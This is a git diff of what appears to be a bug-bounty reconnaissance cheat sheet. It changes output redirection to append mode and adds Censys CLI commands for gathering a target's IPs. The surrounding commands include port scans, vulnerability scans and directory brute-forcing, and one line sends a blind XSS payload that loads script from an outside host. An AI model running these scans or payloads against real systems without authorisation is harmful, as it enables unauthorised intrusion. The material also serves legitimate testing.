@@ -754,27 +754,27 @@ python3 domainCollector.py <orgList>
 
 - 2nd Command for Sorting and http probing
 ```bash
-cat DOM-* | sort -u | grep "DOMAIN.com" | tee ./unique && rm -rf DOM-* external_subdomains && cat unique | wc -l 
+cat DOM-* | sort -u | grep "DOMAIN.com" | tee -a ./unique && rm -rf DOM-* external_subdomains && cat unique | wc -l 
 ```
 
 - 3rd Commands
 ```bash
-cat unique | httpx -silent | tee ./httpx && cat unique | httpx -silent -sc -cl -location -td -server -title | tee ./httpx-code && cat httpx | wc -l
+cat unique | httpx -silent | tee -a ./httpx && cat unique | httpx -silent -sc -cl -location -td -server -title | tee -a ./httpx-code && cat httpx | wc -l
 ```
 
 - 4th Command for dnsgen
 ```bash
-dnsgen unique -w ~/Desktop/dns.txt | httpx -silent | tee ./dnsgen
+dnsgen unique -w ~/Desktop/dns.txt | httpx -silent | tee -a ./dnsgen
 ```
 
 - 5th Command for port scanning
 ```bash
-sudo nmap -T4 -A -p- -sS -iL unique | tee ./nmap && sudo naabu -silent -list unique | tee ./naabu
+sudo nmap -T4 -A -p- -sS -iL unique | tee -a ./nmap && sudo naabu -silent -list unique | tee -a ./naabu
 ```
 
 - 6th Command for jaeles and nuclei automation
 ```bash
-cat httpx | nuclei -silent -t ~/nuclei-templates | tee ./nuclei 
+cat httpx | nuclei -silent -t ~/nuclei-templates | tee -a ./nuclei 
 ```
 ```bash
 jaeles scan -c 50 -s <signature> -U <list_urls>
@@ -782,10 +782,10 @@ jaeles scan -c 50 -s <signature> -U <list_urls>
 
 - 7th Command for wayback urls and remove duplicate
 ```bash
-cat httpx | gau | tee ./gau-1 && cat httpx | gauplus | tee ./gau-2 && cat httpx | waybackurls | tee ./wayback && cat gau-* wayback | sort -u | tee ./finalwaybackurls && rm gau-* wayback && cat finalwaybackurls | wc -l 
+cat httpx | gau | tee -a ./gau-1 && cat httpx | gauplus | tee -a ./gau-2 && cat httpx | waybackurls | tee -a ./wayback && cat gau-* wayback | sort -u | tee -a ./finalwaybackurls && rm gau-* wayback && cat finalwaybackurls | wc -l 
 ```
 ```bash
-cat finalwaybackurls | uro | tee ./uro && cat uro | wc -l
+cat finalwaybackurls | uro | tee -a ./uro && cat uro | wc -l
 ```
 
 - 8th Command for find reflected param & XSS
@@ -806,7 +806,7 @@ cat finalwaybackurls | bxss -payload '"><script src=https://pr0xh4ck.xss.ht></sc
 
 > separete js file from waybackurls
 ```bash
-cat finalwaybackurls | subjs | sort -u | tee ./subjs
+cat finalwaybackurls | subjs | sort -u | tee -a ./subjs
 ```
 
 
@@ -845,7 +845,19 @@ ffuf -recursion=true -e .htm,.shtml,.php,.html,.js,.txt,.zip,.bak,.asp,.aspx,.xm
 dirsearch -r --full-url -e .htm,.shtml,.php,.html,.js,.txt,.zip,.bak,.asp,.aspx,.xml,.sql,.old,.at,.inc  -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u https://target.com -t 70
 ```
 
-
+- 13 Censys cli like pro
+```bash
+censys search ' services.tls.certificates.leaf_data.subject.common_name: "TARGET.com"' --index-type hosts | jq -c '.[] | {ip: .ip}' > censys-ip
+```
+```bash
+sed -i 's/[^0-9,.]*//g' censys-ip
+```
+```bash
+cat censys-ip | httpx -silent -sc -cl -location -td -server -title | tee -a censys-httpx
+```
+```bash
+naabu -iL censys-ip 
+```
 
 
 
